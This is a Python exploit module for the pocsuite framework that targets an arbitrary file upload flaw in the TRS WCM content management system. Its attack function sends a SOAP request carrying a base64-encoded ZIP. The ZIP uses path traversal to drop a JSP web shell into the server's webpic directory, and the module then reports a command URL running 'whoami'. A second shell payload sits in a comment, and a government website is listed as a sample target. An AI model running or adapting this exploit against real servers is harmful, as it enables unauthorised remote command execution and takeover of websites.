#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import requests
import re
import base64
class TestPOC(POCBase):
    vulID = '89487'  # ssvid
    version = '1.0'
    author = ['rainism']
    vulDate = ''
    createDate = '2017-7-24'
    updateDate = '2017-7-24'
    references = ['https://www.secpulse.com/archives/44161.html']
    name = 'TRS WCM多版本 任意文件上传漏洞'
    appPowerLink = 'http://www.trs.com.cn/'
    appName = 'TRS WCM'
    appVersion = ''
    vulType = 'upload files'
    desc = '''
    '''
    samples = [' http://www.scwst.gov.cn']

    def _verify(self):
        result ={}
        payload = '/wcm/services/trswcm:SOAPService?wsdl'
        vulurl =self.url+payload
        resp = requests.get(vulurl)
        if "importDocuments" in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL']=vulurl
            
       
        return self.parse_attack(result)

    def _attack(self):
        result = {}
        payload = '/wcm/services/trswcm:SOAPService'
        vulurl =self.url+payload
        header ={'SOAPAction': '""'}
        #<in0>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</in0>
        #getshell /webpic/help.jspx   xiaomi
        upfiles='<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:impl="http://impl.service.template.trs.com">\n'\
        '   <soapenv:Header/>\n'\
        '   <soapenv:Body>\n'\
        '      <impl:importDocuments soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\n'\
        '         <in0>UEsDBBQAAAAIABaM+EqUc2nIzAEAAKQDAAAfAAAALi4vLi4vLi4vLi4vd2VicGljL3BlbnRlc3QuanNweH2TwY6bMBCGz1lp38H1CSrVVrKnpGFvW2l7adTsC3jNNHgLtmuGQFTl3TuAIVG2WiSQh/n/b37AbN9qvwnOIeuq0tYbKjNeIPqNlG/qqETdWKFdJb/vd3KnDsDv79h0jJ5Z37ataB+ECwe5XK/XsiuwKt/rN/r/E2g0nVhK7QJwdoRQG2czvhQr/jhShrS5CaDRHEF4ysO0swgWX04eMo7QoRzGsr75ZLXLjT1k/PC6eliuuPwAZCrvAmZ8CGWc+Dyoo75nRu9Yg8pjPd9DgyU8ErnbymF9bZA3ju2ry09X9Zyq1sF4MuPUvBwYTuzv/d1iscdAT8V0lbOMBfjTQI3iALhTQVWAEBLuVVcpzdOvvd78Ykkv/pTZpizTgbHYBaehrpkuTNlzfjYWTQU9Jy6TVEAHureOnMWz9Q3SdFAVM5ZMg7m3XHWSKDYWmR6XLcmAJYlmGfkEqfIkTSkP+7JM2ZjHNSh8IBPJChVSHTHnCBO6dDVM8PldLMYIrTL4zYWpfWZaoS5Y8mzpdYTGI+RPnQaPtKcYTDNhmEi5lf79EpSe8Of5cgH9eO/fn2qEStCAkVPaBCLg5svK20976cSNMBZxn5E+/pdU/ANQSwMEFAAAAAAA5or4SgAAAAAAAAAAAAAAAAYAAAAuLi8uLi9QSwMEFAAAAAAA54r4SgAAAAAAAAAAAAAAAAkAAAAuLi8uLi8uLi9QSwMEFAAAAAAA54r4SgAAAAAAAAAAAAAAAAwAAAAuLi8uLi8uLi8uLi9QSwMEFAAAAAAA54r4SgAAAAAAAAAAAAAAABMAAAAuLi8uLi8uLi8uLi93ZWJwaWMvUEsDBBQAAAAAAOWK+EoAAAAAAAAAAAAAAAADAAAALi4vUEsBAj8AFAAAAAgAFoz4SpRzacjMAQAApAMAAB8AJAAAAAAAAAAgAAAAAAAAAC4uLy4uLy4uLy4uL3dlYnBpYy9wZW50ZXN0LmpzcHgKACAAAAAAAAEAGAARRbLMXwTTAZRQYkNPP9EBlFBiQ08/0QFQSwECPwAUAAAAAADmivhKAAAAAAAAAAAAAAAABgAkAAAAAAAAABAAAAAJAgAALi4vLi4vCgAgAAAAAAABABgA4MJDeF4E0wHgwkN4XgTTAeDCQ3heBNMBUEsBAj8AFAAAAAAA54r4SgAAAAAAAAAAAAAAAAkAJAAAAAAAAAAQAAAALQIAAC4uLy4uLy4uLwoAIAAAAAAAAQAYAABBuXheBNMBAEG5eF4E0wEAQbl4XgTTAVBLAQI/ABQAAAAAAOeK+EoAAAAAAAAAAAAAAAAMACQAAAAAAAAAEAAAAFQCAAAuLi8uLi8uLi8uLi8KACAAAAAAAAEAGABwpxR5XgTTAXCnFHleBNMBcKcUeV4E0wFQSwECPwAUAAAAAADnivhKAAAAAAAAAAAAAAAAEwAkAAAAAAAAABAAAAB+AgAALi4vLi4vLi4vLi4vd2VicGljLwoAIAAAAAAAAQAYANDRsXleBNMB0NGxeV4E0wHQ0bF5XgTTAVBLAQI/ABQAAAAAAOWK+EoAAAAAAAAAAAAAAAADACQAAAAAAAAAEAAAAK8CAAAuLi8KACAAAAAAAAEAGAAAgeR2XgTTAQCB5HZeBNMBAIHkdl4E0wFQSwUGAAAAAAYABgA8AgAA0AIAAAAA</in0>\n'\
        '         <in1>.zip</in1>\n'\
        '      </impl:importDocuments>\n'\
        '   </soapenv:Body>\n'\
        '</soapenv:Envelope>\n'\
        
        resp = requests.post(vulurl,headers =header,data =upfiles)
        #print resp.content
        if resp.status_code == 200 and 'true'in resp.content:
            result['ShellInfo'] = {}
            result['ShellInfo']['URL'] = self.url+'/webpic/pentest.jspx'
            result['ShellInfo']['Content'] ='/webpic/pentest.jspx?paxmac=whoami' 
           
                
        return self.parse_attack(result)
    
    def parse_attack(self, result):       
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output                                              

register(TestPOC)
